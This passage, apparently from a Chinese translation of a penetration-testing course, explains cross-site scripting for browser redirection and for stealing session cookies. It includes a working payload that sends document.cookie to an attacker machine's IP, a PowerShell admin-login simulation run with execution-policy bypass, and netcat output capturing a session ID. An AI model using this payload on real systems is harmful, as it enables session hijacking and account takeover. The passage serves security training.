
^268 (Mozilla, 2019). https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe

![](img/ec25e59d75726b7041242a56d3376832_305_0.png)

如上所述，浏览器重定向起作用了，通过 `iframe` 将受害者浏览器发送到了我们的攻击机器。同样，受害者不会在浏览器中看到零大小的 `iframe`。

我们可以走得更远，将受害者浏览器重定向到客户端攻击或信息收集脚本。

为了做到这一点，我们首先需要捕获受害者的 `User-Agent` 头，以帮助识别他们正在使用的浏览器类型。在上面的例子中，我们使用 `Netcat`，因为它向我们显示浏览器发送的完整请求，包括 `User-Agent` 头。`Apache HTTP Server` 默认也会在 `/var/log/apache2/access.log` 中捕获 `User-Agent` 头。

我们不会在这里执行任何客户端攻击。相反，我们将尝试以管理用户身份访问该 Web 应用程序。

### 9.4.2.4 窃取 Cookie 和会话信息

如果应用程序使用不安全的会话管理配置，我们还可以使用 XSS 来窃取 `cookie`[^269] 和会话信息。如果我们能窃取经过身份验证的用户的 `cookie`，我们就可以在目标网站内冒充该用户。

为了提供一些背景知识，网站使用 `cookie` 来跟踪状态[^270]和用户信息。`Cookie` 可以设置多个可选标志，其中有两个对渗透测试者特别感兴趣：`Secure` 和 `HttpOnly`。

`Secure`[^271] 标志指示浏览器仅通过加密连接（如 HTTPS）发送 `cookie`。这保护了 `cookie` 以免以明文形式发送并在网络上被捕获。

`HttpOnly`[^272] 标志指示浏览器拒绝 JavaScript 访问该 `cookie`。如果未设置此标志，我们可以使用 XSS 有效负载来窃取 `cookie`。

然而，即使未设置此标志，我们也必须绕过一些其他的浏览器控制，因为浏览器安全规定由一个域设置的 `cookie` 不能直接发送到另一个域。顺便一提，通过 `Set-Cookie` 指令中的 `Domain` 和 `Path` 标志，这可以放宽为子域名。作为变通方法，如果 JavaScript 可以访问 `cookie` 值，我们可以将其用作链接的一部分，并发送该链接，我们可以分解该链接以检索 `cookie` 值。

让我们尝试一个例子来演示这是如何工作的。我们的示例应用程序在管理员用户登录时会设置一个 `PHPSESSID` `cookie`。应用程序使用该 `cookie` 来确定用户是否

[^269] (Wikipedia, 2019), https://en.wikipedia.org/wiki/HTTP_cookie

[^270] (Wikipedia, 2019), https://en.wikipedia.org/wiki/Session_(computer_science)

[^271] (Wikipedia, 2019), https://en.wikipedia.org/wiki/Secure_cookie

[^272] (Mozilla, 2019), https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies

已完成身份验证。如果修改我们的有效载荷，我们可以捕获受害者的 `PHPSESSID` `cookie`，从而获取其已认证会话的访问权限。

我们将使用 JavaScript 读取该 `cookie` 的值，并将其附加到一个链接回我们攻击机的图片 URL 中。浏览器将读取该 `image` 标签，并将受害者的 `cookie` 作为 URL 查询字符串的一部分，向我们的攻击系统发送一个 GET 请求。

为了实现我们的 `cookie` 窃取器，我们需要按如下方式修改我们的 XSS 有效载荷：

```
<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
```

*列表 290 - 用于窃取 cookie 的 XSS 有效载荷*

一旦我们将此有效载荷提交给应用程序，我们只需等待一个已认证用户访问该应用程序，以便我们窃取 `PHPSESSID` `cookie`。我们可以手动从我们的 Windows 10 实验室机器执行此操作，或者在 Windows 10 实验室机器上使用 PowerShell 脚本（`Documents/admin_login.ps1`）来模拟管理员用户登录：

```
$username="admin"
$password="p@ssw0rd"
$url_login="127.0.0.1/login.php"
$ie = New-Object -com InternetExplorer.Application
$ie.Visible = $true
$ie.navigate($url_login)
while($ie.ReadyState -ne 4){ start-sleep -m 1000}
$ie.document.getElementsByName("username")[0].value="$username"
$ie.document.getElementsByName("password")[0].value="$password"
start-sleep -m 10
$ie.document.getElementsByClassName("btn")[0].click()
start-sleep -m 100
$ie.Quit()
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($ie)
```

*列表 291 - admin_login.ps1*

该脚本创建一个 Internet Explorer 实例，导航至登录页面，登录，然后退出。这足以触发我们的 XSS 有效载荷。我们可以使用 `–ExecutionPolicy Bypass` 来临时允许未签名脚本，并使用 `–File admin_login.ps1` 指定要执行的脚本：

```
C:\Users\admin\Documents> powershell -ExecutionPolicy Bypass -File admin_login.ps1
```

*列表 292 - 运行 PS1 脚本*

当我们的受害者查看受影响的页面时，他们的浏览器将与我们就带有所认证会话 ID 值连接：

```
kali@kali:~$ sudo nc -nvlp 80
listening on [any] 80 ...
connect to [10.11.0.2] from (UNKNOWN) [10.11.0.22] 53824
GET /cool.jpg?output=PHPSESSID=ua19spmd8i3t1l19ac15m2tf176 HTTP/1.1
Referer: http://127.0.0.1/admin.php
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
...
```
